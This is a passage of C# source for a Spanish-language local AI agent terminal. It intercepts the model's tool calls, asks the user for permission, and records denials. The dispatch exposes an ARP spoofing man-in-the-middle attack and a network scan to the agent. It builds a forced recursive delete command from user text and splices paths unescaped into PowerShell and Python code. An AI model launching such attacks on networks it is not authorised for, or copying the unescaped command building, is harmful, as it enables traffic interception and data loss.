            : "\nInforma al usuario de que la acción fue denegada; no digas que se ejecutó. Ajustá tu respuesta al motivo: no vuelvas a proponer la misma acción ni ofrezcas la misma acción de nuevo; preguntale al usuario qué hacer o proponé una alternativa.";
        return head + reasonBlock + instruction;
    }

    private async Task<string> ExecuteToolWithPermissionAsync(ToolRequest tool, bool explicitByUser, CancellationToken cancellationToken, HashSet<string> deniedInTurn)
    {
        // Filtro anti-placeholder: el modelo no conoce rutas reales salvo que el
        // system prompt se las dé; bloquear placeholders en vez de crear carpetas falsas.
        if (tool.Kind is "READ" or "WRITE" && PlaceholderPathPattern.IsMatch(tool.Argument))
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[INTERCEPCIÓN] Ruta placeholder detectada ({Truncate(tool.Argument, 60)}); no se ejecutó nada. Forzando ruta real...");
            Console.ForegroundColor = ConsoleColor.Cyan;
            return PlaceholderInterceptionMessage(tool.Argument);
        }

        string deniedKey = tool.Kind switch
        {
            "READ" or "WRITE" => tool.Kind + "|" + ResolveToolPath(tool.Argument),
            "CMD" => tool.Kind + "|" + tool.Argument.Trim(),
            "PY" => tool.Kind + "|" + tool.Argument.Trim(),
            _ => string.Empty
        };

        if (!string.IsNullOrEmpty(deniedKey) && deniedInTurn.Contains(deniedKey))
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[INTERCEPCIÓN] El modelo repitió una acción que ya negaste; no se vuelve a preguntar.");
            Console.ForegroundColor = ConsoleColor.Cyan;
            return BuildDeniedMessage(tool.Kind, tool.Argument, string.Empty, isRepeat: true);
        }

        string result;
        switch (tool.Kind)
        {
            case "READ":
                var readPath = ResolveToolPath(tool.Argument);
                var insideSandbox = IsInsideSandbox(readPath);
                if (!insideSandbox && !explicitByUser)
                {
                    Console.WriteLine();
                    var decision = AskPermission($"El agente quiere LEER fuera del área de trabajo: {readPath}", dangerous: false, cancellationToken);
                    if (!decision.Allowed)
                    {
                        if (decision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
                        return BuildDeniedMessage("la lectura del archivo", readPath, decision.Reason, isRepeat: false);
                    }
                }

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("[herramienta: READ] ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                result = ExecuteReadTool(tool.Argument);
                lastToolPath = readPath;
                Console.WriteLine($"leyendo {Truncate(readPath, 60)}... listo.");
                break;
            case "CMD":
                var dangerous = DangerousCommandPattern.IsMatch(tool.Argument);
                if (config.CmdMode == "allowlist" && !IsCommandAllowedInAllowlist(tool.Argument))
                {
                    deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("el comando de PowerShell", Truncate(tool.Argument, 60), CmdAllowlistDisabledReason, isRepeat: false);
                }

                Console.WriteLine();
                var cmdDecision = AskPermission($"El agente quiere EJECUTAR en PowerShell: {tool.Argument}", dangerous, cancellationToken);
                if (!cmdDecision.Allowed)
                {
                    if (cmdDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("la ejecución del comando", tool.Argument, cmdDecision.Reason, isRepeat: false);
                }

                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("[herramienta: CMD] ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                result = await ExecuteCmdToolAsync(tool.Argument, cancellationToken);
                // Disparo del fallback por CÓDIGO DE SALIDA (no por la palabra "error" en el texto):
                // la salida incluye "Código de salida: N"; si N != 0, PowerShell falló.
                var exitCodeLine = Regex.Match(result, @"Código de salida: (-?\d+)");
                var cmdFailed = exitCodeLine.Success && exitCodeLine.Groups[1].Value != "0";
                if (cmdFailed)
                {
                    var pyFallback = TryConvertCmdToPython(tool.Argument);
                    if (pyFallback is not null)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine();
                        Console.WriteLine("[FALLBACK] CMD falló. Reintentando con Python...");
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        var pyResult = await ExecutePyToolAsync(pyFallback, cancellationToken);
                        result = pyResult;
                    }
                }
                Console.WriteLine("ejecutando... listo.");
                break;
            case "PY":
                var pyCode = tool.Argument;
                var pyDangerous = DangerousCommandPattern.IsMatch(pyCode);
                Console.WriteLine();
                var pyDecision = AskPermission($"El agente quiere EJECUTAR código Python:\n{Truncate(pyCode, 200)}", pyDangerous, cancellationToken);
                if (!pyDecision.Allowed)
                {
                    if (pyDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("la ejecución de código Python", pyCode, pyDecision.Reason, isRepeat: false);
                }

                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("[herramienta: PY] ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                result = await ExecutePyToolAsync(pyCode, cancellationToken);
                Console.WriteLine("ejecutando... listo.");
                break;
            case "YTDLP":
                var parts = tool.Argument.Split('|');
                var ytdlpUrl = parts[0];
                var ytdlpFormat = parts.Length > 1 ? parts[1] : "mp4";
                Console.WriteLine();
                var ytdlpDecision = AskPermission($"El agente quiere DESCARGAR un video de internet:\nURL: {Truncate(ytdlpUrl, 80)}\nFormato: {ytdlpFormat}\nDestino: C:\\Users\\nicot\\Downloads", dangerous: false, cancellationToken);
                if (!ytdlpDecision.Allowed)
                {
                    if (ytdlpDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("la descarga del video", ytdlpUrl, ytdlpDecision.Reason, isRepeat: false);
                }

                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("[herramienta: YTDLP] ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                result = await ExecuteYtdlpToolAsync(ytdlpUrl, ytdlpFormat, cancellationToken);
                Console.WriteLine("descargando... listo.");
                break;
            case "SCAN":
                var scanRange = tool.Argument;
                if (!config.SecurityToolsEnabled)
                {
                    deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("el escaneo de red", scanRange, SecurityToolsDisabledReason, isRepeat: false);
                }

                Console.WriteLine();
                var scanDecision = AskPermission($"El agente quiere ESCANEAR la red local (ARP) en el rango: {scanRange}\nEsto envía paquetes a todos los dispositivos del rango. Solo usalo en TU red.", dangerous: false, cancellationToken);
                if (!scanDecision.Allowed)
                {
                    if (scanDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("el escaneo de red", scanRange, scanDecision.Reason, isRepeat: false);
                }

                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("[herramienta: SCAN] ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                result = await ExecuteScanToolAsync(scanRange, cancellationToken);
                Console.WriteLine("escaneando... listo.");
                break;
            case "SPOOF":
                var spoofParts = tool.Argument.Split('|');
                var spoofVictim = spoofParts[0];
                var spoofRouter = spoofParts[1];
                var spoofIface = spoofParts.Length > 2 ? spoofParts[2] : "Ethernet";
                if (!config.SecurityToolsEnabled)
                {
                    deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("el ataque ARP spoofing", spoofVictim, SecurityToolsDisabledReason, isRepeat: false);
                }

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[ADVERTENCIA] Esto es un ATAQUE ACTIVO de man-in-the-middle (ARP spoofing).");
                Console.WriteLine("Solo debe usarse en TU PROPIA RED con autorizacion explicita.");
                Console.WriteLine("Puede interrumpir la conectividad de otros dispositivos y exponer trafico sensible.");
                Console.ForegroundColor = ConsoleColor.Cyan;
                var spoofDecision = AskPermission($"El agente quiere ejecutar ARP spoofing:\nIP victima: {spoofVictim}\nIP router: {spoofRouter}\nInterfaz: {spoofIface}\n¿Confirmas que es para pentesting etico en tu propia red?", dangerous: true, cancellationToken);
                if (!spoofDecision.Allowed)
                {
                    if (spoofDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("el ataque ARP spoofing", spoofVictim, spoofDecision.Reason, isRepeat: false);
                }

                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("[herramienta: SPOOF] ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                result = await ExecuteSpoofToolAsync(spoofVictim, spoofRouter, spoofIface, cancellationToken);
                Console.WriteLine("atacando... listo.");
                break;
            case "WRITE":
                var writePath = ResolveToolPath(tool.Argument);
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
                var newContent = tool.Body ?? string.Empty;
                Console.WriteLine($"  Contenido ({newContent.Length} caracteres): {Truncate(newContent.Replace("\r", " ").Replace("\n", " ⏎ "), 160)}");
                
                // Diff preview para escritura
                var diffOutput = BuildDiffHeader(writePath, newContent);
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("  Diff:");
                foreach (var line in diffOutput.Split('\n'))
                {
                    Console.WriteLine("    " + line);
                }
                Console.ForegroundColor = ConsoleColor.Cyan;
                
                var writeDecision = AskPermission($"El agente quiere ESCRIBIR el archivo: {writePath}", dangerous: false, cancellationToken);
                if (!writeDecision.Allowed)
                {
                    if (writeDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
                    return BuildDeniedMessage("la escritura del archivo", writePath, writeDecision.Reason, isRepeat: false);
                }

                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("[herramienta: WRITE] ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                result = ExecuteWriteTool(tool.Argument, newContent);
                lastToolPath = writePath;
                Console.WriteLine("escribiendo... listo.");
                break;
            default:
                return string.Empty;
        }

        return $"[SISTEMA · resultado de herramienta {(explicitByUser ? "pedida por el usuario" : "iniciada por el agente")}]\n{result}\nUsa este resultado real para responder al usuario; no inventes datos y no vuelvas a llamar a la misma herramienta si ya tienes la respuesta.";
    }

    // Intención explícita del usuario: "lee X", "ejecuta Y", "crea el archivo Z con..."
    private string? lastToolPath;
    private static readonly Regex ExplicitReadIntent = new(@"^\s*(?:lee|l[ée]eme|leer|abr[íi]|mostr[áa](?:me)?|muestra|revisa|analiza|resum[íi])\s+(?:(?:el|la|los|las|este|esta|un|una)\s+)?(?:archivo|fichero|carpeta|carpepeta|directorio|contenido\s+de)\s*:?\s*(?<path>.+?)\s*[.!?]*$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex ExplicitCmdIntent = new(@"^\s*(?:ejecuta(?:me)?|ejecutar|corre(?:me)?|correr|lanza(?:r)?)\s+(?:el\s+comando\s+)?(?<cmd>.+?)\s*[.!?]*$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex MoveFolderIntent = new(@"^\s*(?:mov(?:e|é)(?:me)?|traslad(?:a|á)(?:me)?|renombr(?:a|á)(?:me)?)\s+(?:la\s+)?(?:carpeta|directorio|folder)\s+(?:""(?<source>[^""]+)""|(?<source>[^\s]+))\s+(?:a|al|hacia)\s+(?:""(?<dest>[^""]+)""|(?<dest>[^\s]+))", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    // "borra esta carpeta X" / "eliminala" con ruta explícita: el 7B si no, inventa
    // [[WRITE]] carpeta :: (borrar) — WRITE no borra carpetas — o usa rmdir de cmd.exe, que
    // no existe en PowerShell. El host arma el Remove-Item correcto y salta la alucinación.
    private static readonly Regex ExplicitDeleteIntent = new(@"^\s*(?:borra(?:r|me|la|lo)?|elimin(?:a|á|ar)(?:la|lo|me)?|suprim(?:e|í|ir)|quit(?:a|á|ar)(?:me)?)\s+(?:(?:esta|esa|la|el|esto)\s+)?(?:carpeta|directorio|folder|archivo|file)?\s*(?<path>(?:[A-Za-z]:[\\/]|\.[\\/])[^""\r\n]+)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    // "descarga este video en mp4 <url>" / "descargalo en mp3": el 7B a veces alucina y no emite
    // [[YTDLP]] (responde texto incoherente). El host detecta la intención y arma el marcador.
    private static readonly Regex ExplicitDownloadIntent = new(@"^\s*(?:descarga(?:r|me|lo|la)?|descarg(?:a|á)(?:me|lo|la)?|baj(?:a|á)(?:me|lo|la)?)\s+(?:(?:este|ese|esto|esa)\s+)?(?:video|audio|archivo|file)?\s*(?:en|formato)?\s*(?<format>\w{2,4})?\s*(?<url>https?://\S+)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex ExplicitWriteIntent = new(@"^\s*(?:(?:si|dale|ahora|bueno|ok|y)\s+)?(?:crea(?:me|nos)?|crear|escribe(?:me|nos)?|escribir|genera(?:me|nos)?|guarda(?:me|nos)?)\s+(?:(?:un|una|el|la|este|esta)\s+)?(?:archivo|fichero|txt|texto|tecto|nota|documento)\b(?<rest>[\s\S]*)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    // "mejora el index que está en C:\...", "actualiza el index.html de C:\...", "modificá el documento X".
    // El verbo NO es "crear" y el nombre del archivo no viene con artículo ni palabra clave, así que
    // ExplicitWriteIntent no matchea y el host no le ordenaba usar [[WRITE]]: el modelo se quedaba libre
    // y volcaba el código en el chat. Se exige verbo de acción sobre archivo + RUTA REAL, y se excluyen
    // las negaciones ("no modifiques...", "sin escribir...") para no pedir una escritura que el usuario prohibió.
    private static readonly Regex ExplicitModifyIntent = new(@"(?<!no\s)(?<!no me\s)(?<!nunca\s)(?<!sin\s)(?<!jam[áa]s\s)(?<!evita(?:r)?\s)(?<!despu[ée]s\s)(?:crea(?:me|nos)?|crear|escribe(?:me|nos)?|escribir|genera(?:me|nos)?|guarda(?:me|nos)?|generar|mejora(?:r)?|actualiza(?:r)?|modific(?:a|ar|á)|cambi(?:a|ar|á)|reescrib(?:e|er)|rehac(?:e|er)|arregl(?:a|ar)|sobreescrib(?:e|er)|optimi[zsa](?:r|ar))(?![a-záéíóúñ])", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex ExplicitPathPattern = new(@"(?:[A-Za-z]:[\\/][^\s""']+|[^\s""'/\\]+\.\w{1,8})", RegexOptions.Compiled);
    // Ruta absoluta, para preferirla sobre un nombre de archivo suelto que aparezca antes en el texto
    // ("actualiza el index.html de C:\proj\app" → C:\proj\app, no index.html).
    private static readonly Regex ExplicitAbsolutePathPattern = new(@"[A-Za-z]:[\\/][^\s""']+", RegexOptions.Compiled);
    private static readonly Regex ExplicitBodyPattern = new(@"(?:con\s+(?:el\s+)?(?:contenido|texto|t[íi]tulo)|que\s+(?:diga|contenga|tenga|sea))\s*:?\s*(?<body>[\s\S]+)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex ExplicitNamePattern = new(@"t[íi]tulo\s+(?<name>[\w.\-]+)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex ContextReferenceBody = new(@"^\s*(?:(?:con\s+)?(?:to[dw]a\s+)?(?:esta|la)\s+(?:data|info(?:rmaci[oó]n)?)|esto|eso|este\s+texto|ese\s+texto|este\s+contenido|lo\s+(?:anterior|de\s+antes|mencionado|que\s+(?:hablamos|vimos|escribiste)))\s*[.!]*\s*$", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static bool LooksLikePath(string value)
    {
        if (value.Contains("://", StringComparison.Ordinal) || value.Length < 2 || value.Length > 300)
        {
            return false;
        }

        if (value.Contains(':') || value.Contains('\\') || value.Contains('/'))
        {
            return true;
        }

        // Nombre simple con extensión o ruta que existe relativa a la carpeta actual
        return Regex.IsMatch(value, @"^[\w .\-()áéíóúñÁÉÍÓÚÑ]+\.\w{1,8}$");
    }

    private static readonly Regex ActionRequestPattern = new(
        @"\b(instal|agreg|a[ñn]ad|modific|actualiz|cambi|reemplaz|cre|escrib|gener|guard|ejecut|correr|lanz|descarg|configur|repar|arregl|optimiz|limpi|borr|elimin|mejor|hac[ée]r|haz|us|utiliz|prob|test|verific|analiz|revis|leer|mostr|ense[ñn]|explic|ayud|resolv|solucion|comenz|empez|inici|arranc|levant|prend|apag|reinici|reset|formate|particion|mount|desmont|conect|desconect|desinstal|upgrade|downgrade|compil|build|deploy|public|sub|baj|upload|download|copi|mov|renombr|edit|abr|le|grabar|carg|proces|transform|convert|adapt|port|migr|refactoriz|reestructur|redise[ñn]|dise[ñn]|program|codific|desarroll|implement|integr|document|debug|depur|profile|benchmark|monitore|vigil|observ|monitoriz|control|gestion|administr|manej|oper|funcion|trabaj|labor|tare|actividad|proyect|planific|organiz|orden|clasific|categoriz|etiquet|marc|seleccion|eleg|escog|tom|adopt|asum|acept|rechaz|deneg|permit|autoriz|valid|confirm|autentic|identific|registr|anot|apunt|not|coment|describ|detall|especific|defin|establec|fij|pon|coloc|situ|ubic|localiz|encontr|busc|hall|descubr|revel|exhib|present|expon|demostr|chequ|checke|audit|inspeccion|examin|estudi|investig|indag|explor|recorr|naveg|surf|hoj|oj|mir|contempl|apreci|valor|calific|puntu|ranke|rating|opini|critic|elogi|felicit|agradec|d|don|colabor|cooper|asist|socorr|auxili|rescat|salv|preserv|conserv|manten|sosten|sustent|respald|backupe|duplic|replic|clon|reproduc|imit|simul|emul|represent|simboliz|signific|denot|indic|se[ñn]al|evidenci|manifest|expres|comunic|transmit|envi|mand|remit|despach|entreg|repart|distribu|compart|difund|propag|divulg|anunci|proclam|declar|afirm|asever|sost)\w*\b",
        RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static bool IsActionRequest(string prompt)
    {
        return ActionRequestPattern.IsMatch(prompt);
    }

    private bool TryExtractExplicitTool(string prompt, out ToolRequest tool)
    {
        tool = null!;
        var writeMatch = ExplicitWriteIntent.Match(prompt);
        if (writeMatch.Success)
        {
            var rest = writeMatch.Groups["rest"].Value;
            var pathMatch = ExplicitPathPattern.Match(rest);
            string? path = pathMatch.Success ? pathMatch.Value.Trim('"') : null;
            if (path is null)
            {
                string? baseDirectory = null;
                var aliasMatch = FolderAliasPattern.Match(rest);
                if (aliasMatch.Success)
                {
                    // Alias de carpeta real: "Documentos", "Escritorio", "Descargas"
                    baseDirectory = ResolveFolderAlias(aliasMatch.Value);
                }
                else if (lastToolPath is not null)
                {
                    // Sin ruta explícita: usar la carpeta de la última herramienta usada (ej. "en esa carpeta")
                    baseDirectory = Directory.Exists(lastToolPath) ? lastToolPath : Path.GetDirectoryName(lastToolPath);
                }

                if (!string.IsNullOrWhiteSpace(baseDirectory))
                {
                    var nameMatch = ExplicitNamePattern.Match(rest);
                    var fileName = nameMatch.Success ? nameMatch.Groups["name"].Value : null;
                    if (!string.IsNullOrWhiteSpace(fileName))
                    {
                        if (!Path.HasExtension(fileName))
                        {
                            fileName += ".txt";
                        }

                        path = Path.Combine(baseDirectory, fileName);
                    }
                    else if (aliasMatch.Success)
                    {
                        // Alias sin nombre de archivo: ordenar al modelo elegir nombre dentro de la carpeta real
                        path = baseDirectory;
                    }
                }
            }

            if (path is not null)
            {
                var bodyMatch = ExplicitBodyPattern.Match(rest);
                string? body = null;
                if (bodyMatch.Success)
                {
                    var candidate = bodyMatch.Groups["body"].Value.Trim().Trim('"');
                    if (pathMatch.Success)
                    {
                        candidate = Regex.Replace(candidate, Regex.Escape(pathMatch.Value), string.Empty).Trim();
                    }

                    candidate = ExplicitNamePattern.Replace(candidate, string.Empty).Trim(' ', '.', ',', ':', '-');
                    if (candidate.Length >= 5 && !ContextReferenceBody.IsMatch(candidate))
                    {
                        body = candidate;
                    }
                }

                tool = new ToolRequest("WRITE", path, body);
                return true;
            }
        }

        // "mejora el index que está en C:\..." / "actualiza el index.html de C:\proj\app":
        // verbo de acción sobre un archivo + ruta real, pero sin el verbo "crear" ni el nombre con
        // artículo que exige ExplicitWriteIntent. Antes esto no matcheaba, el host no le ordenaba usar
        // [[WRITE]] y el modelo volcaba el código en el chat (ver compuerta "artefacto en el chat").
        // Cuerpo null a propósito: el usuario no dio el contenido literal, así que el host inyecta la
        // orden de emitir [[WRITE]] usando la conversación como fuente del contenido.
        if (ExplicitModifyIntent.IsMatch(prompt))
        {
            var candidate = ExtractRealPathFromText(prompt);
            if (candidate.Length > 0 && LooksLikePath(candidate))
            {
                tool = new ToolRequest("WRITE", candidate, null);
                return true;
            }
        }

        var deleteMatch = ExplicitDeleteIntent.Match(prompt);
        if (deleteMatch.Success)
        {
            var path = deleteMatch.Groups["path"].Value.Trim().Trim('"');
            if (path.Length >= 3 && LooksLikePath(path))
            {
                tool = new ToolRequest("CMD", "Remove-Item -LiteralPath \"" + path + "\" -Recurse -Force", null);
                return true;
            }
        }

        var downloadMatch = ExplicitDownloadIntent.Match(prompt);
        if (downloadMatch.Success)
        {
            var url = downloadMatch.Groups["url"].Value.Trim();
            var format = downloadMatch.Groups["format"].Success ? downloadMatch.Groups["format"].Value.Trim().ToLowerInvariant() : "mp4";
            if (url.Length >= 10)
            {
                tool = new ToolRequest("YTDLP", url + "|" + format, null);
                return true;
            }
        }

        var readMatch = ExplicitReadIntent.Match(prompt);
        if (readMatch.Success && LooksLikePath(readMatch.Groups["path"].Value))
        {
            tool = new ToolRequest("READ", readMatch.Groups["path"].Value.Trim().Trim('"'), null);
            return true;
        }

        var cmdMatch = ExplicitCmdIntent.Match(prompt);
        if (cmdMatch.Success)
        {
            var candidate = cmdMatch.Groups["cmd"].Value.Trim();
            if (candidate.Length >= 2 && candidate.Length <= 300)
            {
                tool = new ToolRequest("CMD", candidate, null);
                return true;
            }
        }

        var moveMatch = MoveFolderIntent.Match(prompt);
        if (moveMatch.Success)
        {
            var source = moveMatch.Groups["source"].Value.Trim().Trim('"');
            var dest = moveMatch.Groups["dest"].Value.Trim().Trim('"');
            if (source.Length >= 3 && dest.Length >= 3)
            {
                var pyCode = "import shutil\nshutil.move(\"" + source + "\", \"" + dest + "\")\nprint('OK: carpeta movida')";
                tool = new ToolRequest("PY", pyCode, null);
                return true;
            }
        }

        return false;
    }

    private static readonly HttpClient WebClient = CreateWebClient();

    private static HttpClient CreateWebClient()
    {
        var client = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
        client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) IA27Terminal/1.0");
        return client;
    }

    private async Task<string> AskWithNetPermissionAsync(ECnetServerSession session, string prompt, Func<string, Task> onToken, CancellationToken cancellationToken)
    {
        // Buffer anti-fugas: retiene la cola del stream para que el marcador [[NET]]
        // (y cualquier texto previo) nunca llegue a imprimirse en consola.
        var streamBuffer = new StringBuilder();
        Func<string, Task> bufferedToken = piece =>
        {
            streamBuffer.Append(piece);
            var cut = streamBuffer.ToString().LastIndexOf('[');
            if (cut < 0)
            {
                cut = Math.Max(0, streamBuffer.Length - 14);
            }
            else if (cut == 0 && streamBuffer.Length > 200 && (streamBuffer.Length < 2 || streamBuffer[1] != '['))
            {
                cut = 1;
            }

            if (cut <= 0)
            {
                return Task.CompletedTask;
            }

            var chunk = streamBuffer.ToString(0, cut);
            streamBuffer.Remove(0, cut);
            return onToken(chunk);
        };

        Task FlushBufferAsync()
        {
            if (streamBuffer.Length == 0)
            {
                return Task.CompletedTask;
            }

            var chunk = StripToolMarkers(streamBuffer.ToString());
            streamBuffer.Clear();
            // Colas que solo son fragmentos de marcador (p. ej. "[" o "[[WRI") no se imprimen
            if (chunk.Length == 0 || chunk.Length < 20 && chunk.Trim().StartsWith('['))
            {
                return Task.CompletedTask;
            }

            return onToken(chunk);
        }

        void DiscardBuffer() => streamBuffer.Clear();

        var pendingWriteExecuted = false;
        var pendingCmdExecuted = false;
        var writtenPaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var deniedInTurn = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        if (TryExtractExplicitTool(prompt, out var explicitTool))
        {
            if (explicitTool is { Kind: "WRITE", Body: null })
            {
                // El usuario pidió crear el archivo pero no dio el contenido literal
                // (ej. "con toda esta data"): ordenar al modelo emitir [[WRITE]] usando el contexto.
                var targetHint = Directory.Exists(ResolveToolPath(explicitTool.Argument))
                    ? $"La ruta indicada es una CARPETA: \"{explicitTool.Argument}\". Elegí vos el archivo de esa carpeta que pidió el usuario (si habló de \"el index\", es \"{Path.Combine(ResolveToolPath(explicitTool.Argument), "index.html")}\") y poné ESA ruta completa en el marcador."
                    : $"Ruta indicada: \"{explicitTool.Argument}\".";
                session.AddContextMessage($"[SISTEMA · el usuario pidió explícitamente crear un archivo]\n{targetHint} El contenido debe basarse en la conversación anterior. Tu respuesta debe EMPEZAR EXACTAMENTE por [[WRITE]] <ruta completa INCLUDING el nombre del archivo> :: <contenido completo> y TERMINAR con [[END]]. No expliques el código en el chat, no lo muestres aparte y no afirmes que lo creaste: el sistema lo hará tras el permiso del usuario y te confirmará.");
            }
            else
            {
                try
                {
                    var explicitResult = await ExecuteToolWithPermissionAsync(explicitTool, explicitByUser: true, cancellationToken, deniedInTurn);
                    if (explicitTool.Kind == "WRITE" && !ToolWasDenied(explicitResult))
                    {
                        pendingWriteExecuted = true;
                        writtenPaths.Add(ResolveToolPath(explicitTool.Argument));
                    }
                    if (explicitTool.Kind == "CMD" && !ToolWasDenied(explicitResult)) { pendingCmdExecuted = true; }
                    session.AddContextMessage(explicitResult + $"\nPedido original del usuario: \"{prompt}\"");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkBlue;
                    Console.Write("IA27> ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                }
                catch (TerminalException toolError)
                {
                    session.AddContextMessage($"[SISTEMA · herramienta fallida]\n{toolError.Message}\nInforma al usuario del error sin inventar resultados. Pedido original: \"{prompt}\"");
                }
            }
        }
        else if (config.NetEnabled && TryExtractExplicitSearchQuery(prompt, out var explicitQuery))
        {
            var explicitAuthorized = session.NetAutoAllowed || AuthorizeNet(session, explicitQuery, cancellationToken);
            if (explicitAuthorized)
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("[buscando en la web...] ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                var explicitResults = await SearchWebAsync(explicitQuery, cancellationToken);
                var explicitContext = explicitResults is not null
                    ? $"[SISTEMA · el usuario pidió explícitamente buscar en internet: \"{explicitQuery}\"]\n{explicitResults}\nEl usuario preguntó: \"{prompt}\". Responde usando estos datos reales de la web; cita la fuente cuando sea posible y NO inventes nada. Si los resultados no tratan del tema, dilo claramente."
                    : $"[SISTEMA · búsqueda fallida para \"{explicitQuery}\"]\nNo fue posible consultar internet ahora. Responde con tu propio conocimiento dejando claro que no se pudo verificar en internet y sin inventar datos.";
                session.AddContextMessage(explicitContext);
                Console.WriteLine("listo.");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("IA27> ");
                Console.ForegroundColor = ConsoleColor.Cyan;
            }
        }

        // Refuerzo de modo agente: si el usuario pide acciones (instalar, modificar, ejecutar),
        // inyectar un mensaje de sistema más fuerte para que el modelo emita marcadores.
        if (IsActionRequest(prompt))
        {
            session.AddContextMessage("[SISTEMA · MODO AGENTE]\nEl usuario pidió una acción concreta. Tu respuesta debe EMPEZAR EXACTAMENTE con el marcador de herramienta correspondiente:\n- [[CMD]] <comando> para ejecutar comandos (instalar software, ejecutar scripts, etc.)\n- [[WRITE]] <ruta> :: <contenido> [[END]] para escribir archivos\n- [[READ]] <ruta> para leer archivos\nNO expliques en el chat, NO le pidas al usuario que lo haga a mano, NO muestres código sin emitir el marcador. El sistema ejecutará la acción y te confirmará el resultado.");
        }

        var content = await session.AskAsync(prompt, bufferedToken, cancellationToken);
        var netRounds = 0;
        var toolRounds = 0;
        var claimRetries = 0;
        var writeExecuted = pendingWriteExecuted;
        var cmdExecuted = pendingCmdExecuted;
        var originalPrompt = prompt;
        var searchContext = (string?)null;
        while (true)
        {
            var toolRequest = MatchToolRequest(content);
            if (toolRequest is not null)
            {
                if (toolRounds >= 5)
                {
                    DiscardBuffer();
                    session.ReplaceLastAssistant(StripToolMarkers(content));
                    return "Alcancé el límite de 5 usos de herramientas seguidos en este turno; reformulá el pedido o continúalo en otro mensaje.";
                }

                toolRounds++;
                DiscardBuffer();
                var cleanedTool = StripToolMarkers(content);
                session.ReplaceLastAssistant(cleanedTool);
                string toolContext;
                var resolvedWritePath = toolRequest.Kind == "WRITE" ? ResolveToolPath(toolRequest.Argument) : null;
                if (resolvedWritePath is not null && writtenPaths.Contains(resolvedWritePath))
                {
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"[INTERCEPCIÓN] Escritura duplicada bloqueada: {Truncate(resolvedWritePath, 60)} ya fue creado en este turno.");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    toolContext = $"[SISTEMA · escritura duplicada bloqueada]\nEl archivo \"{resolvedWritePath}\" YA fue creado en este turno; no se volvió a escribir. NO reemitas [[WRITE]]: confirmá al usuario citando la confirmación de creación que ya recibiste del sistema.";
                }
                else
                {
                    try
                    {
                        toolContext = await ExecuteToolWithPermissionAsync(toolRequest, explicitByUser: false, cancellationToken, deniedInTurn);
                        if (toolRequest.Kind == "WRITE" && resolvedWritePath is not null && !ToolWasDenied(toolContext))
                        {
                            writeExecuted = true;
                            writtenPaths.Add(resolvedWritePath);
                        }
                        if (toolRequest.Kind == "CMD" && !ToolWasDenied(toolContext)) { cmdExecuted = true; }
                    }
                    catch (TerminalException toolError)
                    {
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[herramienta: {toolRequest.Kind}] error: {toolError.Message}");
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        toolContext = $"[SISTEMA · herramienta {toolRequest.Kind} fallida]\n{toolError.Message}\nInforma al usuario del error; no inventes el resultado.";
                    }
                }

                session.AddContextMessage(toolContext);
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("IA27> ");
